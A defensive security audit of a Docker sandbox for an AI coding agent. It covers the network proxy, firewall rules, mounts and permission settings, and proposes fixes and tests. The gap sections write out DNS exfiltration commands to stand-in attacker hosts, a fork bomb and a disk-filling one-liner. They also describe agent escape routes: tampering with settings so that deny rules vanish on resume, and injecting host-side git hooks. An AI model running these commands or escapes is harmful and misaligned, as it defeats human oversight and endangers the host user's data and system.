# Security Audit: claude-container — 2026-05-22

## 1. Threat model recap

claude-container runs Claude Code (an LLM coding agent) inside a rootless Docker container alongside a per-session mitmproxy sidecar. The threat actor is a *confused agent*: Claude may misunderstand its context and attempt to read credential files, exfiltrate data to arbitrary hosts, modify files outside its workspace, or manipulate its own permission configuration. The model is NOT an actively-exploiting attacker with shell-level exploit knowledge, but a plausible upper bound is a Claude instance that follows instructions from a prompt-injection in the workspace. The design goal is containment such that a worst-case Claude cannot escape the container, exfiltrate data outside the proxy allowlist, modify host filesystem beyond explicitly-mounted folders, or escalate privilege on the host.

---

## 2. Strengths

- **Shared network namespace with default-deny nftables.** `nix/proxy-image.nix:33–107` installs an `inet claude_proxy_fw` table with `policy drop` on the OUTPUT chain. The Claude container joins this netns via `--network container:` (`internal/docker/docker.go:173–174`), so the firewall covers every process in both containers. Claude has no NIC of its own and cannot install its own nftables rules because NET_ADMIN is only granted to the proxy container (`internal/httpproxy/httpproxy.go:240`).

- **Transparent mitmproxy redirect catches all TCP.** `nix/proxy-image.nix:103–105` redirects every TCP packet (from any uid other than 1500, the mitmproxy uid) to port 8080 via `meta l4proto tcp redirect to :8080`. Claude cannot connect to an arbitrary IP on any TCP port without going through the proxy's addon rule check.

- **QUIC/HTTP3 blocked at the firewall.** `nix/proxy-image.nix:73` drops `udp dport 443`, forcing TLS clients to downgrade to TCP where the redirect catches them. Confirmed in code.

- **Dashboard auth token never exposed to Claude.** The proxy writes the token at `/config/dashboard-token` (uid 1500, mode 0600) via `proxy/claude_proxy/app.py:113–114`. The Claude container's `ConfigDir` is mounted at `/claude`, which maps to `<configDir>/containers/<session>/` (`internal/config/config.go:230`), a different subtree than `<configDir>/proxy-state/<session>/` where the token lives. The Claude container therefore cannot read the token via the filesystem.

- **Credential files mounted individually read-only, not as a directory.** `internal/config/config.go:192–207` enumerates only `.credentials.json`, `settings.json`, and `.claude.json` from the host's `~/.claude/`. Each is mounted as a separate RO bind at `/mnt/claude-host/<filename>:ro` (`internal/docker/docker.go:219–221`). The host's conversation history, git data, and SSH keys in `~/.claude/` are not exposed.

- **No docker socket exposed.** A scan of all `RunArgs`, `TaskRunArgs`, and `ShellArgs` in `internal/docker/docker.go` finds no `-v /var/run/docker.sock` mount. Confirmed by `TestSecurity_NoDockerSocketLeak` in `cmd/security_e2e_test.go:596`.

- **Per-session network isolation.** `internal/httpproxy/httpproxy.go:40–43` names the Docker network `claude-proxy-net_<session>`. Each session creates a distinct network, and the Claude container joins only the matching proxy netns. `TestSecurity_SiblingIsolation` (`cmd/security_e2e_test.go:1000`) probes cross-session reachability.

- **Managed settings written host-side, not inside the container.** `internal/session/launch.go:107–116` writes `managed-settings.json` to the session config dir before the container starts. The container entrypoint copies it to `/etc/claude-code/managed-settings.json` at startup (`nix/image.nix:164–166`). Claude cannot rewrite the source on the host filesystem (it has no access to the host `<configDir>/containers/<session>/` path directly — it only sees it as `/claude`).

## 3. Gaps

### GAP-1: DNS over UDP/53 bypasses the proxy entirely — exfiltration via DNS tunneling

**Attack:** Claude runs `nslookup <base64-payload>.attacker.com` or any DNS-capable tool. The nftables ruleset at `nix/proxy-image.nix:66–69` explicitly accepts `udp dport 53` and `tcp dport 53` with no restrictions. DNS queries leave the container without going through mitmproxy and without matching any rule in the RuleStore. Data of arbitrary length can be exfiltrated by encoding it in subdomain labels (e.g., `<base64chunk>.attacker.com`). Even with a strict domain allowlist (`profile=high`), the DNS channel is fully open.

**Why mitigations are insufficient:** The proxy intercepts HTTP/HTTPS (TCP 80/443) and other TCP protocols, but UDP port 53 packets bypass the NAT redirect rule entirely (`output_nat` chain only matches `meta l4proto tcp`). The existing test `TestSecurity_DNS_UDP53_Unproxied` (`cmd/security_e2e_test.go:1046`) explicitly documents this as a *known gap* rather than asserting containment.

**Fix:** Drop unrestricted UDP/53 from the nftables ruleset and redirect DNS to an internal resolver (e.g., `dnsmasq` running as mitmproxy uid 1500) that only resolves names matching the current proxy allowlist. Alternatively, use DNS-over-HTTPS exclusively and block plain DNS entirely. Change in `nix/proxy-image.nix:66–69`: replace `udp dport 53 accept` with a rule that redirects to an internal resolver or drops it. This will require a small DNS sidecar process running as uid 1500 inside the proxy container.

---

### GAP-2: `/claude` (the session config dir) is mounted read-write — Claude can tamper with managed-settings.json, conversation history, and the live rules file

**Attack:** The `ConfigDir` is mounted read-write at `/claude` (`internal/docker/docker.go:199`: `-v opts.ConfigDir+":/claude"`). This directory is `<configDir>/containers/<session>/`. The entrypoint copies `managed-settings.json` from `/claude/` to `/etc/claude-code/managed-settings.json` at *startup*, but the copy is a one-shot operation. After that, `/claude/managed-settings.json` is writable by Claude throughout the session. More concretely:

1. Claude can write `{}` to `/claude/managed-settings.json`. This has no effect on the *current* session (Claude Code already loaded it from `/etc/claude-code/`), but it means a *resumed* session (which re-runs the entrypoint via `docker start`) picks up the tampered settings file and loses all deny rules.
2. The live proxy rules file lives at `<configDir>/proxy-state/<session>/rules.json` on the host, mounted at `/config/rules.json` in the *proxy* container — not in `/claude`. However, `/claude/projects/` (conversation history JSONL) is the same directory, and Claude can append arbitrary content to its own transcript, potentially poisoning future resumed sessions via prompt injection in the conversation context.

**Why mitigations are insufficient:** `TestSecurity_ManagedSettings_ReadOnlyFromContainer` (`cmd/security_e2e_test.go:956`) tests writing to `/claude/managed-settings.json` but does not verify whether the entrypoint re-reads it on `docker start` after a tamper. The test only verifies the current mount permissions, which are read-write (the test is expected to see `rc=0` for the write). The comment in the test says "if `rc=0` we fail", meaning the test *does* expect the write to be denied — but the mount is declared read-write in `RunArgs`. This test will fail at runtime, revealing the gap: `/claude` is RW.

**Fix:** Split the per-session config directory into a read-only portion (managed-settings, baked-in hooks) and a read-write portion (conversation history JSONL, `settings.json` that Claude may update). In `internal/docker/docker.go:RunArgs`, change the ConfigDir mount to read-only:
```
"-v", opts.ConfigDir+":/claude:ro"
```
Then add a separate RW volume for conversation output: `-v opts.ConfigDir+"/projects":/claude/projects` and `/claude/tmp` for Claude's scratch space. This prevents tampering with managed-settings on the next resume.

### GAP-3: No resource limits — fork bomb / memory bomb / disk exhaustion

**Attack:** Claude runs `:(){ :|:& };:` (fork bomb), `python3 -c "open('/workspace/bomb','wb').write(b'A'*10**12)"` (disk exhaustion), or a tight loop allocating memory. None of `RunArgs`, `TaskRunArgs`, or `ShellArgs` in `internal/docker/docker.go` pass `--pids-limit`, `--memory`, `--cpus`, or `--ulimit`. A single confused Claude session can render the host's Docker daemon and potentially the entire host unresponsive.

**Why mitigations are insufficient:** Complete absence of resource limiting flags. Even rootless Docker on Linux does not automatically apply resource limits. There are no ulimit constraints set either at the container level or in the image entrypoint.

**Fix:** In `internal/docker/docker.go:RunArgs` and `TaskRunArgs`, append:
```go
"--pids-limit", "512",
"--memory", "4g",
"--memory-swap", "4g",   // disable swap
"--cpus", "2.0",
```
Values should be tunable via `RunOpts` fields or environment variables. The proxy container (`internal/httpproxy/httpproxy.go:RunArgs`) should also get `--pids-limit 128` and `--memory 512m`.

### GAP-4: `autoAllowBashIfSandboxed: true` combined with `allowUnsandboxedCommands: true` neutralises the sandbox

**Attack (confused agent):** `internal/sandbox/sandbox.go:ManagedSettingsForProxy` (line 324–333) sets both `autoAllowBashIfSandboxed: true` and `allowUnsandboxedCommands: true` in the `sandbox` block for every profile including `high`. `autoAllowBashIfSandboxed` means Claude pre-approves all Bash commands that run inside the sandbox without asking. `allowUnsandboxedCommands: true` means if the inner bubblewrap sandbox fails (which it always does in Docker due to missing kernel namespaces), commands run anyway without sandboxing. Together these mean: for profiles `low`, `default`, and `med` — which already have `allToolsAllow` — every Bash command runs without restriction at the tool-permission level. For `high`, the explicit `DenyPerms` list (`Bash(curl *)`, `Bash(wget *)`) still applies, but `autoAllowBashIfSandboxed` means the bubblewrap inner sandbox would have auto-approved them if it worked.

**Why mitigations are insufficient:** The combination creates a confusing layering where the outer tool-permission rules (allow/deny lists) are the only real enforcement, but the `sandbox` block gives the impression of an additional layer. `allowUnsandboxedCommands: true` explicitly opts out of the last-resort sandbox fallback. The baked-in `nix/managed-settings.nix:19` also sets this. There is no documentation distinguishing what `autoAllowBashIfSandboxed` does versus the `permissions.allow/deny` lists, making it easy for a future maintainer to misconfigure the system believing the sandbox provides a second layer of protection it does not actually provide.

**Fix:** Remove `allowUnsandboxedCommands: true` from `ManagedSettingsForProxy` (`internal/sandbox/sandbox.go:329`) and from `nix/managed-settings.nix:19`. If bubblewrap unavailability should be tolerated, handle it explicitly with a comment explaining that `enableWeakerNestedSandbox` is the correct fallback. Add a comment making clear that `autoAllowBashIfSandboxed` only operates within the tool-permission allow/deny framework and does not bypass explicit deny rules.

### GAP-5: The `/claude` config dir is shared across container restarts, leaking the writable `managed-settings.json` and `settings.json` to resumed sessions

**Attack:** (Extends GAP-2 with a specific resume-path vector.) When a session is resumed via `docker start <container>` (e.g., `claude-container attach <name>`), the container entrypoint re-runs and copies `/claude/managed-settings.json` to `/etc/claude-code/managed-settings.json`. If Claude (during a prior session) wrote a permissive `managed-settings.json` to `/claude/`, the resumed session will load those permissive settings. This allows a ratchet: session 1 starts locked, Claude modifies `/claude/managed-settings.json` to drop deny rules, session 2 starts permissive.

**Why mitigations are insufficient:** The entrypoint in `nix/image.nix:164–166` unconditionally copies whatever `/claude/managed-settings.json` contains. The Go launcher (`internal/session/launch.go:114`) writes a fresh `managed-settings.json` to the session config dir *only at launch time*, not on every `docker start`. The `RefreshAuthCmd` in `internal/docker/docker.go:570–573` only refreshes credential files, not settings.

**Fix:** Have `internal/session/launch.go` also write `managed-settings.json` as part of the `docker start` flow (i.e., write it before every attach, not just at initial launch). Alternatively, mount managed-settings as a separate read-only tmpfs overlay. A minimal fix: in `docker.go:RefreshAuthCmd`, extend the script to re-copy `managed-settings.json` from a host-side authoritative copy before Claude resumes.

### GAP-6: Worktree bind-mounts include `.git/hooks/` — Claude can inject host-side git hooks

**Attack:** The worktree is bind-mounted at `/workspace` (or `/mnt/repo` → symlinked to `/worktrees/<branch>` which is inside the repo). The `.git/hooks/` directory of the worktree is a subdirectory of the repo and is accessible to Claude inside the container. Claude can write an executable `pre-commit` hook to `.git/hooks/`. When the *host user* later runs `git commit` in the repo (or the worktree), the pre-commit hook executes on the *host* with the *host user's permissions*, outside any container isolation. This is a container-escape-via-git-hook vector.

**Why mitigations are insufficient:** `internal/git/git.go` does not neutralise hooks. The worktree setup in `nix/image.nix:228–238` does nothing to restrict hook execution. The `internal/docker/docker.go:RunArgs` mount at line 129 (`-v opts.Workspace+":/workspace"`) grants full read-write access to the workspace, which includes `.git/`. There is no test in `cmd/security_e2e_test.go` for this vector.

**Fix:** On the host side, after creating a worktree, configure `git config core.hooksPath /dev/null` for that worktree to disable hook execution. In `internal/git/git.go:CreateWorktree`, add:
```go
exec.Command("git", "-C", worktreeDir, "config", "core.hooksPath", "/dev/null").Run()
```
Alternatively, document this as an accepted risk (see §4) if the threat model excludes intentional hook injection (the confused-agent model probably does not write adversarial hooks, but prompt-injection in the workspace might).

## 4. Accepted design choices

- **`nix profile install nixpkgs#<pkg>` is fully permitted.** The nix store is mounted read-write (`-v claude-nix-store:/nix/var`), the proxy allowlist for `default` profile includes `cache.nixos.org` and GitHub, and the entrypoint runs `nix profile install` if `EXTRA_PACKAGES` is set (`nix/image.nix:283–299`). Claude can install any package from nixpkgs (including `nmap`, `socat`, `netcat`, etc.) during a session. This is an explicit UX tradeoff: Claude needs to be able to install dev tooling. The network proxy limits where installed tools can *connect*, but doesn't limit what tools can be installed. This should be explicitly noted in the threat model: capability expansion through nix install is a known-accepted risk under the confused-agent model. Mitigation is the domain-level allowlist, not tool-level restriction.

- **`/workspace` is mounted read-write with full git tree access.** Claude's entire purpose is to read and write code. Mounting the workspace read-only would prevent this. The known consequence (also GAP-6) is that Claude can write to `.git/hooks/`. For the confused-agent model where Claude is not malicious, this is accepted; for a higher-threat model it needs the fix in GAP-6.

- **Conversation history (JSONL) is writable by Claude.** Claude writes its own transcript to `/claude/projects/`. This is necessary for resume functionality. The risk is prompt injection via prior conversation content — future sessions that resume will see whatever Claude wrote in a prior session. This is explicitly noted in the audit task description as likely out-of-scope and is accepted.

- **The `bypassPermissionsModeAccepted` flag is force-set to `true` in the entrypoint** (`nix/image.nix:146–149`). This bypasses Claude Code's human-in-the-loop permission dialog for the container. This is intentional: the managed-settings file provides programmatic permission control, and interactive prompts would break non-TTY (`task`, `background`) modes.

- **`/get_pending` is unauthenticated.** `proxy/claude_proxy/dashboard.py:123–127` allows any process to call `GET /api/pending` without a token. Claude can therefore observe which of its own flows are held, which it uses (via the proxy-pending-hook) to generate helpful context for the user. Only mutating endpoints require auth. This is a deliberate tradeoff: the hook needs to read pending status to surface it, and the hook runs inside the container.

## 5. Test coverage gaps

The existing `cmd/security_e2e_test.go` covers the proxy approval workflow (A0), network enforcement (A), filesystem isolation (B), and a small LLM-driven suite (C, opt-in). The following scenarios are missing and would catch or document the gaps found above:

1. **GAP-1 (DNS exfil): Add a `TestSecurity_DNS_Exfil_DataInSubdomain` test.** Spin up a session, then use `docker exec` to run a crafted `nslookup $(echo SECRETDATA | base64).example-attacker.test`. Verify via tcpdump or a local DNS capture that the subdomain containing the encoded data reaches the wire. Currently `TestSecurity_DNS_UDP53_Unproxied` only confirms DNS resolves; it doesn't attempt actual data-in-subdomain encoding.

2. **GAP-2 (config dir writable): Add a `TestSecurity_ManagedSettings_WritableAndPersistsOnResume` test.** Write a permissive `{}` to `/claude/managed-settings.json` from inside the container, stop and restart the container, then verify via `docker exec cat /etc/claude-code/managed-settings.json` that the tampered settings were *not* loaded (i.e., the entrypoint should prefer a host-authoritative copy). This test would currently fail, demonstrating the gap.

3. **GAP-3 (resource exhaustion): Add a `TestSecurity_ForkBomb_PidsLimitEnforced` test.** Use `docker exec` to run a fork bomb or a rapid process spawner and verify the container is killed or limited before the host is impacted. Check `docker inspect` for `HostConfig.PidsLimit > 0`.

4. **GAP-6 (git hooks): Add a `TestSecurity_GitHook_WrittenByContainerDoesNotExecuteOnHost` test.** Have the container write an executable `pre-commit` hook to `/workspace/.git/hooks/pre-commit` that writes a sentinel file to `/tmp/hook-escape-<session>`. After the container exits, run `git -C <worktree> commit --allow-empty -m test` on the host and verify the sentinel file was NOT created (i.e., hooks are disabled via `core.hooksPath=/dev/null`).

5. **GAP-5 (settings tamper on resume): Add a `TestSecurity_SettingsTamper_ResumeClearsSettings` test.** Launch a session, write a malicious managed-settings.json to `/claude/`, stop the container, then `docker start` it again and exec `cat /etc/claude-code/managed-settings.json` to verify the file contains the original Go-generated settings, not the tampered ones. Currently this test is absent; its failure would force the `RefreshAuthCmd`-style fix.

6. **Missing coverage for `sandbox.autoAllowBashIfSandboxed` behaviour (GAP-4):** Add a unit test in `internal/sandbox/sandbox_test.go` that calls `ManagedSettingsForProxy` with various profiles and asserts the resulting JSON does *not* contain `allowUnsandboxedCommands: true`. This is a regression guard.
